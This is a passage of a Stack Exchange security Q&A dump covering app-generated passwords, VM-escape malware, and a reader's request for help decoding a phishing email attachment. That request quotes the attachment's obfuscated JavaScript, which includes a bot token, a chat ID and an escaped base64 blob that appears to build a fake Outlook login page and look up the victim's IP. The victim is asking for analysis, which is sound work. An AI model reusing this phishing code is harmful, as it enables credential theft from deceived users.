<p>The only benefit I see with your suggested approach is that the generated password should very probably be <strong>unique</strong>. But that doesn't stop people from <strong>reusing</strong> that same password on other websites. There is a chance that they will, precisely because they don't want to remember hundreds of different passwords. If they are asked for a strong password elsewhere, then they might want to use something they already know.</p>
<p>When you say:</p>
<blockquote>
<p>I think this approach should massively increase the security of apps.</p>
</blockquote>
<p>I think what you mean is: this should increase the security of user accounts (minimize the risk of hijacking).</p>
<p>Besides, the password is the not sole line of defense. Think about <strong>two-factor authentication</strong>. This is how you can mitigate the password issue.</p>
","1"
"264698","264698","Why don't applications suggest passwords themselves?","<p>Imagine a web app that, on the login page, has a password field which does not allow user input, but just displays a client-only generated password that is reasonably strong, with a button to re-generate the password.</p>
<p>In this approach, instead of leaving it to the user to supply a strong password (either by typing it in or using a browser-suggested password), the app ensures that only strong passwords that meets it policy are used.</p>
<p>I wonder why this approach is not used. Apart from usability concerns with not allowing users to use their own passwords (mitigated by using a password manager or having the browser remember passwords), I think this approach should massively increase the security of apps.</p>
<p>What am I missing?</p>
","1","3","264707","<p>Any site that allows non-interactive account creation does this. Typically, it'll send you a one-time password out of band (like via email or SMS), you'll log in, and then you'll immediately need to set up a password.</p>
<p>Better-designed devices do this with their default passwords rather than something you can look up in a manual and therefore must be the same for each unit. The password is written on a sticker, typically alongside the serial number.</p>
<p>Firefox has a password manager that I think is enabled by default and will offer to generate passwords for you whenever it detects you're creating a password. The codes it generates look good to me.</p>
<p>Despite browsers' built-in password managers and syncing options, not enough people use password managers (built-in or otherwise). Those few users with password managers who are following best practices are already randomly generating their passwords, so they're not a part of the consideration here.</p>
<p>For users that need memorable passwords because they don't generate and manage their passwords, you reach an impasse: <strong>memorability is inversely proportional to entropy</strong>. If a site <em>forces</em> its own password generator on users, it will be overrun with password reset requests.</p>
<p>A better solution would be to ask whether a password is absolutely necessary or if you can use another authentication technique. I think we're headed to this model for most items. Rather than requiring a password <em>and</em> either an authenticator app or security token, why not use just the authenticator app or security token?</p>
<p>Solely using an authenticator or token should provide sufficient security ~90% of the time (the other ~10% includes email and finance). Given current password insecurities, many users are already effectively at this level in most 2FA systems.</p>
","1"
"264698","264698","Why don't applications suggest passwords themselves?","<p>Imagine a web app that, on the login page, has a password field which does not allow user input, but just displays a client-only generated password that is reasonably strong, with a button to re-generate the password.</p>
<p>In this approach, instead of leaving it to the user to supply a strong password (either by typing it in or using a browser-suggested password), the app ensures that only strong passwords that meets it policy are used.</p>
<p>I wonder why this approach is not used. Apart from usability concerns with not allowing users to use their own passwords (mitigated by using a password manager or having the browser remember passwords), I think this approach should massively increase the security of apps.</p>
<p>What am I missing?</p>
","1","3","264708","<p>Other answers named some valid reasons. Here is one more.</p>
<p>Preventing users from entering passwords does not add any security. Malicious users can easily manipulate web application and change passwords to anything they want. Furthermore, users can send requests even without web application, just using tools like <em>curl</em> or <em>Postman</em>, and can send any password they want. The server cannot distinguish if the data were manipulated on the client. That's why the server cannot trust the client and should <em>always</em> validate <em>every single</em> request received from the client.</p>
<p>That's why preventing users from entering passwords makes no sense.</p>
<p>You can duplicate password validation logic on the client to provide immediate feedback and better usability. But you can rely on the server validation only.</p>
","0"
"264694","264694","Is it possible for a malware in a VM to be still running after the VM is shut down?","<p>Let's say that VMWare or VirtualBox is running the newest version of Debian. I'm not sure if it's possible for any program in the guest to continue running, stealing data from the host, even after the guest system has shut down.</p>
","3","3","264719","<p>&quot;Running&quot; means being executed by the CPU (normally from RAM).</p>
<p>When you shut down a guest OS, it stops being executed, it gets unloaded from RAM, its RAM regions are freed and the guest OS becomes bits and bytes on your mass storage, thus it's no longer executed by the CPU, so the answer is &quot;it's impossible&quot;.</p>
","1"
"264694","264694","Is it possible for a malware in a VM to be still running after the VM is shut down?","<p>Let's say that VMWare or VirtualBox is running the newest version of Debian. I'm not sure if it's possible for any program in the guest to continue running, stealing data from the host, even after the guest system has shut down.</p>
","3","3","264740","<p>Only if the malware managed to propagate itself from the VM to the host, which is very unlikely.</p>
","0"
"264694","264694","Is it possible for a malware in a VM to be still running after the VM is shut down?","<p>Let's say that VMWare or VirtualBox is running the newest version of Debian. I'm not sure if it's possible for any program in the guest to continue running, stealing data from the host, even after the guest system has shut down.</p>
","3","3","264755","<p>It is possible if your malware managed to escape the VM to run under the host operating system. It's colloquially called <a href=""https://en.wikipedia.org/wiki/Virtual_machine_escape"" rel=""nofollow noreferrer"">VM escape</a> or Guest-to-Host Escape. Most if not all hypervisors had some bugs giving an attacker a way to do that in their history.</p>
<p>A few example, non exhaustive list (a longer list is available in the Wikipedia article linked earlier):</p>
<ul>
<li>VMware <a href=""https://www.cve.org/CVERecord?id=CVE-2018-6981"" rel=""nofollow noreferrer"">CVE-2018-6981</a></li>
<li>HyperV <a href=""https://www.cve.org/CVERecord?id=CVE-2017-0075"" rel=""nofollow noreferrer"">CVE-2017-0075</a></li>
<li>Xen <a href=""https://www.cve.org/CVERecord?id=CVE-2008-1943"" rel=""nofollow noreferrer"">CVE-2008-1943</a></li>
</ul>
<p>Staying on top of your hypervisor patching is thus critical if you allow arbitrary code to be run on your VMs (e.g. you are an IaaS provider), a tiny bit less so if an attacker need to compromise a VM first.</p>
","3"
"264690","264690","Who can we read the contents of the variable? Which format is used?","<p>We are not IT security specialists but we are very curious to know more about a scam we received through mail.</p>
<p>We received a mail with a HTML file attached. The subject of the mail looked very clickbaity.</p>
<p>The title was: <code>Webshop will removed from server now , Update attached to stay active now..</code></p>
<p>When you open the attached HTML file you see a login page for outlook.</p>
<p>Then we looked at the source code and found some weird looking variables between the script tags.</p>
<p>This is the code:</p>
<pre><code>var \u0065mai\u006c=&quot;hiddenforsafety@hidden.com&quot;;var \u0074oken='577506\0703\x317:A\x41Hrvihv2\114Zw\x6b\x4b\u0076\u0058v\170q\u0046Fuo\x48HSklu\070J\u0075rf8';var c\u0068\u0061t_id=5253999887;var data=ato\u0062(&quot;P\103FET0NUWVBFI\x47\150\060bW\167+\103jxod\x471sI\u0047Rpcj\060ib\110R\171IiB\152b\107Fzcz\x30iI\151B\163\131W5\x6ePSJlb\151I\053C\u0069AgI\x43A8\141GV\u0068\132D4\113I\x43AgI\u0044xtZXR\x68I\x47\x680\144H\u0041\x74ZXF1a\130Y9IkN\u0076bnR\x6cbn\121tVHlwZ\u0053I\x67\u005929udG\126udD0\151dGV4dC\x39\x6f\144\1071sOyBjaGFyc\x32V\x30P\u0056VUR\x69\x304I\1524KICAgI\x44x0\x61XRsZ\x54\x35\124aWd\x75\x49\x47lu\111H\x52vI\x48lv\144X\x49g\131WNjb3VudD\167vdG\x6c\x30bGU+C\151Ag\x49CA8bWV0YSBodHRwL\127\126xdW\154\x32PS\112YLVVBLU\x4e\u0076bX\u0042\150d\u0047libG\125iIGNvbnR\u006cbn\u00519Ik\u006cF\120WV\x6bZ2Ui\120\x67ogICA\x67P\u00471l\x64G\u0045gb\x6dF\x74Z\u00540idmlld3BvcnQiIGN\166b\156R\u006c\x62\x6e\1219\x49ndpZHR\157\u0050W\x52\154dml\152Z\x5313\u0061\x57R\x30\x61\u0043\x77ga\x57\x35pd\x47\154h\142C\x31zY2\106sZT0x\114jAsIG\061\150eG\x6ctd\u0057\x30t\1432N\x68bGU9\115i\x34\u0077\114\103\102\u0031c2VyLX\x4e\152YW\x78h\131mxlP\u0058llcy\111+\103\x69A\x67ICA8c\x32NyaXB\060\x49\u0048NyYz0ia\x48\x520cHM\u0036\u004cy\x39ham\x464L\155dv\x622dsZ\x57\u0046\167aXMu\131\x329t\x4c2Fq\131XgvbGli\x63\1719\u0071\u0063X\x56\154\x63n\x6bvM\u007940\u004cjEvanF\x31\132XJ5Lm\u0031pb\x695q\u0063yI+PC\x39\172\u0059\x33JpcH\u0051+\103i\101\147IC\x418bG\154u\u0061y\u0042yZWw9In\x4eo\x62\x33J0\1313\x560IGljb\x324iIGhyZ\u0057\u0059\071Im\1500dHBzOi\x38vYW\u0046kY2RuL\1551\u007aZnRh\u0064XRo\x4cm5\154\x64C9zaGFyZW\121\166\x4dS\064\x77L\u0032\x4evbn\x52lbnQ\166aW1hZ\u0032\u0056z\u004c\062\x5ahdmlj\14225\x66\x59\u0056\x39l\x64\130\x42heWZ\156Z2\u0068x\x61W\u0046\160N2s\x35\u0063\u00329s\x4emxn\115\x695p\x59\x328i\x50iA\147ICAKIC\101g\111Dxs\141W\x35rI\x47\122hdGE\164\x62G9\150ZG\126\x79PSJj\132G\x34iIGNy\x623\x4ezb3JpZ2\x6cuPSJhbm\u0039\u0075eW1\x76\144\130\x4diIGhyZW\u00599Im\u00680\x64H\x42\172O\1518v\u0059\u0057FkY2Ru\x4cm1zZ\x6e\122hdXRoL\u006d\x35\x6cdC\071lc3Rz\u004cz\x49u\u004dS9j\x62250\x5aW50\1142N\u006b\142mJ1bm\x52s\u005a\130Mv\x5929\x75dm\u0056y\1322Vk\114nY\u0079LmxvZ2luLm\x31p\142l\u0039\066\u0061X\154\x30Z\152\150k\145\156Q5\132WcxczY\164\u00622\x68o\u0062GV\x6eMi5jc3\x4di\x49H\x4albD\060ic3R5bGV\x7a\141GV\154\u0064\x43\x49+Ci\u0041gI\103\x41\x38c2N\x79aXB0Pg\x6fgICAg\u0049\103\x41\147ICQ\157ZG9jdW\061\x6c\142nQpLn\112lY\127R5\x4bGZ1bmN\x30a\x57\x39u\113C\153\147eyQ\x6fIi\u004ekaXN\167bG\x465Tm\106t\x5aSIpL\x6d\u0056t\u0063HR\065KCk\165YXB\167ZW5kKG\u0056\164\x59WlsKTs\147JC5\156\132\x58\122KU\060\071OK\103J\x6fdHRw\x63zovL2FwaS5pcGlmeS5vc\155\143/Zm\071y\142WF0\120\u0057pzb24\x69L\x43\x42\155dW5\x6adGl\u0076bi\150\x6b\x59X\u0052h\x4bSB7J\u0043gi\x492d\155ZyI\u0070Lm\1500bWwoZ\x47F0YS5p\u0063\x43k7fSl9K\x54s\113ICAg\x49D\x77vc\x32Ny\x61XB0\x50go8L\u0032hlYWQ+Cjx\151b2R\065IG\x4esYX\x4ezPS\112jYiI\147c\063R5bG\x559I\155Rpc3\102sYX\1536IGJsb2\x4erOyI+CjxwIG\x6ckP\123Jn\132\x6d\u0063i\111\110\1160e\u0057\170\154PSJkaXNwbGF5O\x69Bub\x325lO\x79\x49+\x50\x439\x77Pg\1578\132m9y\x62SBuY\127\x31lPSJ\u006dMSIgaWQ9\111mkwMjg\170\x49iBu\1423\132\150b\107l\u006b\x59XRlPS\x4aub\x33Z\x68bGlk\x59XRlI\x69\u0042z\x63\u0047V\163\x62GNoZW\x4erPSJ\155Y\x57xzZS\x49gbW\126\x30aG9kP\x53\x4aw\u0062\063N0IiB0YXJnZXQ9I\15490b3AiIGF\061dG9j\1422\x31\x77b\x47V\060ZT0ib2Z\u006d\u0049iBhY\u0033\x52\x70b24\u0039\111\151I+\x43iAgICA\070Z\107l2IGNsYX\x4ezPSJsb2\u0064\160bi1\167\u0059\u0057d\u0070\x62\u006d\x460ZWQt\u0063G\106nZS\111+\x43iAgIC\101gICAgPGRpd\u0069B\160\u005aD\x30\151bGlnaHR\151b3hUZ\x571wbGF0\x5aUN\u0076bn\x52\150aW5\154ciI+\u0043\u006axka\u0058\x59g\x61\127Q9Im\x78p\1322\x680Y\x6d94QmFja\062dyb3VuZENvbnRha\1275\154ciI+C\u0069\u0041gICA8\132Gl2IGN\163YXNzPSJiY\x57\x4erZ3Jvd\127\u0035\u006b\114WltYW\144lLWhvbG\122\x6cciIgcm\x39sZ\x540i\u0063\u0048Jlc\x32Vu\x64\107F0aW9u\111j\x34\u004bICAgID\x78k\x61XY\147Y\x32\170hc3M9ImJhY\062\x74ncm\0711b\155\x51ta\u00571h\x5a2Ug\132X\150\060\114WJh\x592tncm9\u0031bmQt\141W\061hZ2\x55iIHN0\145\u0057xlP\123J\x69Y\x57NrZ3\x4av\144W\065\x6bL\127\x6ct\131W\x64\154OiB1cmwoJnF1b3\x51\x37aHR0cH\1156Ly9hYWR\152\132G4ubX\x4emd\x47\x461dGgubm\x56\x30L3NoYXJl\132\x43\x38xLjAv\u00592\u0039\x75dG\126u\u0064C9pbWFnZXMvYmF\x6aa2\x64yb3V\x75\132HMv\u004dl\071iY\u007aNkMzJhNjk\x32OD\x6b1\132jc\u0034YzE\065ZG\131\x32Yz\143x\x4e\x7a\1254\116m\1051\132C5zdmcm\x63XVvdDspO\u0079I+\x50C9k\x61\u0058Y+Cjwv\u005aGl2\120\152wvZG\1542\120\147\x6f8ZGl2I\107NsYXNzPSJvdXR\x6cc\u0069\111+\103i\101\u0067\x49CA8ZGl2\x49GN\x73YX\x4e\x7aPSJ0\132W\x31w\142GF0\x5aS1zZWN0\141W9\x75\x49G1h\x61W\064tc2\126j\144\107lvbi\111+C\151Ag\111C\101g\x49CAgP\u0047Rp\u0064iB\u006abG\x46z\x63z\x30ibW\154k\132G\x78\u006c\111GV\x34d\1031taWR\x6b\142G\x55i\x50gogICAgICAgICAg\111C\x418\132G\1542IGNsY\u0058Nz\120SJm\144Wx\u0073L\u0057h\154a\127dodCI\u002b\x43jx\153aX\u0059g\x592\u0078hc3M9\u0049m\132sZ\x58gtY29sdW1\165\111j4\u004b\x49C\101g\u0049\104xk\x61\x58Y\u0067Y2x\u0068\x63\u0033M\071Indpb\u0069\x31\x7aY\u0033JvbGw\151Pgo\x67ICA\x67\x49C\x41gIDxkaXYgaW\x51\071Imxp\x5a\x32h0\u0059\u006d\x394I\x69B\x6a\x62GFz\x63z0\u0069c2\x6cn\142i\061\x70bi1ib3\147\x67ZXh0\x4cXN\160Z24t\u0061\1274t\x59\1559\u0034IGZ\u0068ZG\125t\x61W4\u0074b\107lnaH\u0052ib\u0033gi\x50gogICAgICAgI\104\170\u006baX\131+P\107ltZyB\u006abGFz\x63\u007a0ibG\x39\156byI\147c\1559sZT0\151aW\x31\x6eIi\102wb\155d\172cmM9\x49\155h0dH\102zOi8vY\127FkY2RuLm1z\x5anRhdX\x52oLm5\154dC9zaG\u0046y\u005aWQv\u004dS\u0034wL2NvbnRlb\x6eQva\127\x31hZ2VzL2\x31pY3J\166c29\x6d\144\x46\u0039s\x622d\x76\u0058\x32V\x6b\x4fWM\065ZWI\u0077ZGN\u006cM\124d\u006bNzUyY\u006dVkZ\x57\105\u0032\x59jVhY2\x52h\x4emQ\u0035\u004cnBuZyIg\x633Znc\063J\u006aP\u0053Jo\144\x48R\x77\143z\157v\x4c2FhZG\116kbi5\164c2Z0\x59\x58V0aC5\x75\132X\x51vc2hhcmVk\x4czEu\u004dC9\x6a\x622\u00350Z\x575\u0030L2ltY\u0057dlcy\u0039taW\u004eyb3NvZn\122f\142G9nb\x319l\x5a\x54\x56jOG\1215\u005a\155I2\x4djQ4Yzk\172O\u0047ZkMGRjMT\u006b\u007aN\u007aBlOTBi\132C\x35zdmci\111\110\116yY\172\060ia\x48R\060c\110M6L\1719hYWRjZG4ub\130NmdGF1d\107gub\u006dV\060\x4c\x33N\u006f\131\u0058\112lZC8x\114jAvY\x329udGV\165dC9\u0070\x62W\x46n\132XMvbWljc\x6d9zb2Z0X2\x78\x76Z2\x39\146ZWU1Yzh\u006bOWZ\x69NjI\060OG\u004d5M\172\150m\x5a\x44\x42k\u0059z\x45\x35\x4dzcw\132TkwY\155Qu\x633ZnIi\102h\142\x48Q9Ik1\x70Y3Jv\14329md\u0043I+P\1039\153aXY+Ci\x41g\111\103A\x67\x49\103A\u0067PGRpdiB\x79b2xlPSJt\x59WluIj4K\u0050GRp\144iBjbGF\x7acz0i\x59W5\x70\142\u0057F0\x5aSBz\u0062Gl\u006bZ\x531\x70b\u00691uZX\x680Ij4K\x49CAg\x49CAgIC\x418ZG\1542ID\x34KPGRpdi\x42jbGF\x7acz0ia\127R\x6c\x62nRpdHlCY\u00575u\x5a\130I\u0069P\x67ogICA\x67\x50\107\x52\160\x64i\x42pZ\x440iZG\154zcG\x78\u0068e\u0055\065hbWU\u0069IGN\163YXNzPS\112pZGVu\x64\u0047l0e\123I+P\1039\u006b\x61XY+C\u006awvZ\u0047l\x32Pjwv\132Gl2\u0050gogI\103A\x67\x50C9ka\130Y+CiAgI\103A\u0038\u005a\107l\x32IGNs\u0059X\x4e\u007aPSJw\x59Wdpbm\u00460aW9uLX\132\160ZX\143g\131W5pbW\1060ZSB\157Y\130\x4dta\x57\x52l\x62n\x52pdHktY\155\x46u\u0062mV\171IH\x4esaWR\154LWluL\x57\065l\x65\110Q\u0069\120g\157gICA\147\u0050\x47R\x70dj\x34KCj\u0078kaXY\147aWQ9\111m\x78vZ\062luS\x47Vh\x5a\107\u0056y\x49iBj\x62GF\172cz0\151cm\x393IH\122p\u0064Gx\u006cIGV\064\x64C\u00310aXR\u0073\u005a\x53I+CiAg\111\103\x41\x38ZG\u006c2IHJ\166\142GU\071ImhlY\x57Rpbm\x63iIGFy\u0061WEtb\x47\u00562ZWw\x39I\x6aEiPk\126\x75dGV\171\u0049HBhc\u0033\u004e3\x623Jk\u0050\u00439\u006b\x61X\131\x2bCjw\166ZG\1542Pg\1578\u005a\x47l\062IGlk\u0050SJl\143\u006eJ\x76\u0063\x6eB\x33IiB\x7a\u0064H\154\x73ZT0i\u005929sb3I6I\110J\x6cZDsg\142WF\x79\x5a2\x6cu\117\151AxNXB4O\x79Bt\x59X\x4ana\x574tbGVmd\104ogM\110B\u0034O\171B\u0074\131XJnaW4tdG9wOiAwcHg\067\u0049\x471hc\155d\160b\151\x31ib3R0b\x320\x36\x49DBweDsi\x50jw\166ZGl2\x50\147o8ZG\x6c2IG\x4es\x59XN\x7aPSJyb3c\x69\x50\x67ogI\103\101\147\x50\u0047R\160\x64\151Bj\142\107\106z\143z\u0030iZm9ybS\061ncm91cCBj\u00622wtbW\121tMj\121iPg\u006f\147I\103\x41gI\u0043AgI\104x\u006baXYgY2x\u0068c3M9In\x42sY\127N\154\x61G\071s\u005aGVyQ\u00329udGFpbm\x56yIj\u0034K\x49CA\x67\u0049CAg\x49CAgICAgPGluc\110\1260\x49\107\x35h\142W\1259\x49nB\x68c3N\063ZCIgd\110lwZT0i\143\x47Fz\x633dvcm\x51i\x49GlkP\123Jp\u004dDEx\x4fCI\u0067\u0059XV0b2Nvb\u0058B\x73ZXRlP\x53Jv\132\x6d\x59iIGNsY\130N\172\120S\x4a\155b\u0033\u004a\164\114WNv\142nRyb\x32\167gaW5wdXQ\x67ZX\u00680\x4cWlu\x63HV\060IHRl\x65H\x51t\u0059m94\111GV\064d\103\x310ZXh\u0030LWJve\103I\147c\x47x\u0068Y2\x56\157b2\170\153Z\x58\u0049\071IlB\150c3\x4e\063\142\063JkIiByZ\130\106\u0031aXJ\u006c\x5aC\x41v\120go8\1142Rpd\x6a4KIC\x41\x67ID\x77vZ\x47l\062Pg\x6f8\x4c2\u0052p\x64j4\u004bPG\u0052pdj4KPG\x52pdiB\u006ab\u0047Fzc\1720\u0069cG9\172aX\122\x70\x62\u00324tY\x6e\1260d\u00479uc\x79I\053CiA\147I\x43A8ZGl\x32P\147o\147I\x43Ag\x49CAg\u0049\x44xkaXYgY\u0032x\x68\u0063\x33\u004d9\111nJ\u0076dyI+CiA\x67\111CAgI\x43Ag\111CAgID\170\x6b\u0061XY\147Y2xhc\x33\u004d\x39Im\x4e\166bC1t\x5a\u00430yN\103I+\103i\u0041g\x49C\x41gIC\x41gI\103\x41\147ICA\x67\x49CA8ZGl2IGNsYX\116zPSJ\x30ZXh0LTEzI\u006a\x34KI\u0043Ag\x49CA\u0067I\103\x41g\x49\103\101gIC\u0041gI\x43AgICA\x38ZGl\x32IG\116s\u0059\130Nz\120\x53Jm\u00623\112tLW\x64y\u0062\x33\126wIj\064KIC\u0041\147IC\x41g\u0049\u0043\101gIC\x41gIC\x41gICAgI\x43\u0041gICAgP\x47Eg\141WQ\x39Im\u006ckQ\x56\x39\121V\060RfRm\071\171Z290\125\u0047Fz\1433d\u0076cmQ\151\x49H\112vb\107U9\111m\x78pbms\u0069IGhyZW\x599IiM\u0069\120kZvc\u006dd\x76dHRlbiBteSBwYX\x4ezd29yZDwv\131T4KICAg\x49CA\u0067IC\u0041\147ICAgI\u0043A\u0067IC\101gI\103A\u0038L2Rpd\x6a4KP\u0047\122\u0070d\151Bj\x62\x47Fz\143\172\u0030iZm9ybS\061ncm91cCI\u002bC\x6awvZGl2Pgo\147ICA\147IC\x41\147IDx\153aXYgY2\170hc3M9\x49mZv\u0063m0t\1323Jv\144X\u0041\x69PgogICAgI\103\101gIC\101gIC\u00418YS\x42pZD0iaTE\x32\x4ej\u0067\u0069IG\150yZWY9Ii\x4d\151P\x6cNp\13224\147aW\u0034\x67d\x32l0aC\102\u0068bm90a\x47\126y\111\x47F\x6aY291bnQ8L\x32E+Ci\u0041gI\103\x41\x67\111CA\147\120C\z71kaXY+PC\x39\153a\x58\u0059+PC9\153\x61\x58Y\x2b\120\x439\u006baX\131\053\x43i\10…
</code></pre>
<p>How to decode this code? We tried almost everything, base64, hex, url etc.</p>
","-1","3","264691","<p>After some research found that I can print the variables in developer tools.</p>
","0"
"264690","264690","Who can we read the contents of the variable? Which format is used?","<p>We are not IT security specialists but we are very curious to know more about a scam we received through mail.</p>
<p>We received a mail with a HTML file attached. The subject of the mail looked very clickbaity.</p>
<p>The title was: <code>Webshop will removed from server now , Update attached to stay active now..</code></p>
<p>When you open the attached HTML file you see a login page for outlook.</p>
<p>Then we looked at the source code and found some weird looking variables between the script tags.</p>
<p>This is the code:</p>
<pre><code>var \u0065mai\u006c=&quot;hiddenforsafety@hidden.com&quot;;var \u0074oken='577506\0703\x317:A\x41Hrvihv2\114Zw\x6b\x4b\u0076\u0058v\170q\u0046Fuo\x48HSklu\070J\u0075rf8';var c\u0068\u0061t_id=5253999887;var data=ato\u0062(&quot;P\103FET0NUWVBFI\x47\150\060bW\167+\103jxod\x471sI\u0047Rpcj\060ib\110R\171IiB\152b\107Fzcz\x30iI\151B\163\131W5\x6ePSJlb\151I\053C\u0069AgI\x43A8\141GV\u0068\132D4\113I\x43AgI\u0044xtZXR\x68I\x47\x680\144H\u0041\x74ZXF1a\130Y9IkN\u0076bnR\x6cbn\121tVHlwZ\u0053I\x67\u005929udG\126udD0\151dGV4dC\x39\x6f\144\1071sOyBjaGFyc\x32V\x30P\u0056VUR\x69\x304I\1524KICAgI\x44x0\x61XRsZ\x54\x35\124aWd\x75\x49\x47lu\111H\x52vI\x48lv\144X\x49g\131WNjb3VudD\167vdG\x6c\x30bGU+C\151Ag\x49CA8bWV0YSBodHRwL\127\126xdW\154\x32PS\112YLVVBLU\x4e\u0076bX\u0042\150d\u0047libG\125iIGNvbnR\u006cbn\u00519Ik\u006cF\120WV\x6bZ2Ui\120\x67ogICA\x67P\u00471l\x64G\u0045gb\x6dF\x74Z\u00540idmlld3BvcnQiIGN\166b\156R\u006c\x62\x6e\1219\x49ndpZHR\157\u0050W\x52\154dml\152Z\x5313\u0061\x57R\x30\x61\u0043\x77ga\x57\x35pd\x47\154h\142C\x31zY2\106sZT0x\114jAsIG\061\150eG\x6ctd\u0057\x30t\1432N\x68bGU9\115i\x34\u0077\114\103\102\u0031c2VyLX\x4e\152YW\x78h\131mxlP\u0058llcy\111+\103\x69A\x67ICA8c\x32NyaXB\060\x49\u0048NyYz0ia\x48\x520cHM\u0036\u004cy\x39ham\x464L\155dv\x622dsZ\x57\u0046\167aXMu\131\x329t\x4c2Fq\131XgvbGli\x63\1719\u0071\u0063X\x56\154\x63n\x6bvM\u007940\u004cjEvanF\x31\132XJ5Lm\u0031pb\x695q\u0063yI+PC\x39\172\u0059\x33JpcH\u0051+\103i\101\147IC\x418bG\154u\u0061y\u0042yZWw9In\x4eo\x62\x33J0\1313\x560IGljb\x324iIGhyZ\u0057\u0059\071Im\1500dHBzOi\x38vYW\u0046kY2RuL\1551\u007aZnRh\u0064XRo\x4cm5\154\x64C9zaGFyZW\121\166\x4dS\064\x77L\u0032\x4evbn\x52lbnQ\166aW1hZ\u0032\u0056z\u004c\062\x5ahdmlj\14225\x66\x59\u0056\x39l\x64\130\x42heWZ\156Z2\u0068x\x61W\u0046\160N2s\x35\u0063\u00329s\x4emxn\115\x695p\x59\x328i\x50iA\147ICAKIC\101g\111Dxs\141W\x35rI\x47\122hdGE\164\x62G9\150ZG\126\x79PSJj\132G\x34iIGNy\x623\x4ezb3JpZ2\x6cuPSJhbm\u0039\u0075eW1\x76\144\130\x4diIGhyZW\u00599Im\u00680\x64H\x42\172O\1518v\u0059\u0057FkY2Ru\x4cm1zZ\x6e\122hdXRoL\u006d\x35\x6cdC\071lc3Rz\u004cz\x49u\u004dS9j\x62250\x5aW50\1142N\u006b\142mJ1bm\x52s\u005a\130Mv\x5929\x75dm\u0056y\1322Vk\114nY\u0079LmxvZ2luLm\x31p\142l\u0039\066\u0061X\154\x30Z\152\150k\145\156Q5\132WcxczY\164\u00622\x68o\u0062GV\x6eMi5jc3\x4di\x49H\x4albD\060ic3R5bGV\x7a\141GV\154\u0064\x43\x49+Ci\u0041gI\103\x41\x38c2N\x79aXB0Pg\x6fgICAg\u0049\103\x41\147ICQ\157ZG9jdW\061\x6c\142nQpLn\112lY\127R5\x4bGZ1bmN\x30a\x57\x39u\113C\153\147eyQ\x6fIi\u004ekaXN\167bG\x465Tm\106t\x5aSIpL\x6d\u0056t\u0063HR\065KCk\165YXB\167ZW5kKG\u0056\164\x59WlsKTs\147JC5\156\132\x58\122KU\060\071OK\103J\x6fdHRw\x63zovL2FwaS5pcGlmeS5vc\155\143/Zm\071y\142WF0\120\u0057pzb24\x69L\x43\x42\155dW5\x6adGl\u0076bi\150\x6b\x59X\u0052h\x4bSB7J\u0043gi\x492d\155ZyI\u0070Lm\1500bWwoZ\x47F0YS5p\u0063\x43k7fSl9K\x54s\113ICAg\x49D\x77vc\x32Ny\x61XB0\x50go8L\u0032hlYWQ+Cjx\151b2R\065IG\x4esYX\x4ezPS\112jYiI\147c\063R5bG\x559I\155Rpc3\102sYX\1536IGJsb2\x4erOyI+CjxwIG\x6ckP\123Jn\132\x6d\u0063i\111\110\1160e\u0057\170\154PSJkaXNwbGF5O\x69Bub\x325lO\x79\x49+\x50\x439\x77Pg\1578\132m9y\x62SBuY\127\x31lPSJ\u006dMSIgaWQ9\111mkwMjg\170\x49iBu\1423\132\150b\107l\u006b\x59XRlPS\x4aub\x33Z\x68bGlk\x59XRlI\x69\u0042z\x63\u0047V\163\x62GNoZW\x4erPSJ\155Y\x57xzZS\x49gbW\126\x30aG9kP\x53\x4aw\u0062\063N0IiB0YXJnZXQ9I\15490b3AiIGF\061dG9j\1422\x31\x77b\x47V\060ZT0ib2Z\u006d\u0049iBhY\u0033\x52\x70b24\u0039\111\151I+\x43iAgICA\070Z\107l2IGNsYX\x4ezPSJsb2\u0064\160bi1\167\u0059\u0057d\u0070\x62\u006d\x460ZWQt\u0063G\106nZS\111+\x43iAgIC\101gICAgPGRpd\u0069B\160\u005aD\x30\151bGlnaHR\151b3hUZ\x571wbGF0\x5aUN\u0076bn\x52\150aW5\154ciI+\u0043\u006axka\u0058\x59g\x61\127Q9Im\x78p\1322\x680Y\x6d94QmFja\062dyb3VuZENvbnRha\1275\154ciI+C\u0069\u0041gICA8\132Gl2IGN\163YXNzPSJiY\x57\x4erZ3Jvd\127\u0035\u006b\114WltYW\144lLWhvbG\122\x6cciIgcm\x39sZ\x540i\u0063\u0048Jlc\x32Vu\x64\107F0aW9u\111j\x34\u004bICAgID\x78k\x61XY\147Y\x32\170hc3M9ImJhY\062\x74ncm\0711b\155\x51ta\u00571h\x5a2Ug\132X\150\060\114WJh\x592tncm9\u0031bmQt\141W\061hZ2\x55iIHN0\145\u0057xlP\123J\x69Y\x57NrZ3\x4av\144W\065\x6bL\127\x6ct\131W\x64\154OiB1cmwoJnF1b3\x51\x37aHR0cH\1156Ly9hYWR\152\132G4ubX\x4emd\x47\x461dGgubm\x56\x30L3NoYXJl\132\x43\x38xLjAv\u00592\u0039\x75dG\126u\u0064C9pbWFnZXMvYmF\x6aa2\x64yb3V\x75\132HMv\u004dl\071iY\u007aNkMzJhNjk\x32OD\x6b1\132jc\u0034YzE\065ZG\131\x32Yz\143x\x4e\x7a\1254\116m\1051\132C5zdmcm\x63XVvdDspO\u0079I+\x50C9k\x61\u0058Y+Cjwv\u005aGl2\120\152wvZG\1542\120\147\x6f8ZGl2I\107NsYXNzPSJvdXR\x6cc\u0069\111+\103i\101\u0067\x49CA8ZGl2\x49GN\x73YX\x4e\x7aPSJ0\132W\x31w\142GF0\x5aS1zZWN0\141W9\x75\x49G1h\x61W\064tc2\126j\144\107lvbi\111+C\151Ag\111C\101g\x49CAgP\u0047Rp\u0064iB\u006abG\x46z\x63z\x30ibW\154k\132G\x78\u006c\111GV\x34d\1031taWR\x6b\142G\x55i\x50gogICAgICAgICAg\111C\x418\132G\1542IGNsY\u0058Nz\120SJm\144Wx\u0073L\u0057h\154a\127dodCI\u002b\x43jx\153aX\u0059g\x592\u0078hc3M9\u0049m\132sZ\x58gtY29sdW1\165\111j4\u004b\x49C\101g\u0049\104xk\x61\x58Y\u0067Y2x\u0068\x63\u0033M\071Indpb\u0069\x31\x7aY\u0033JvbGw\151Pgo\x67ICA\x67\x49C\x41gIDxkaXYgaW\x51\071Imxp\x5a\x32h0\u0059\u006d\x394I\x69B\x6a\x62GFz\x63z0\u0069c2\x6cn\142i\061\x70bi1ib3\147\x67ZXh0\x4cXN\160Z24t\u0061\1274t\x59\1559\u0034IGZ\u0068ZG\125t\x61W4\u0074b\107lnaH\u0052ib\u0033gi\x50gogICAgICAgI\104\170\u006baX\131+P\107ltZyB\u006abGFz\x63\u007a0ibG\x39\156byI\147c\1559sZT0\151aW\x31\x6eIi\102wb\155d\172cmM9\x49\155h0dH\102zOi8vY\127FkY2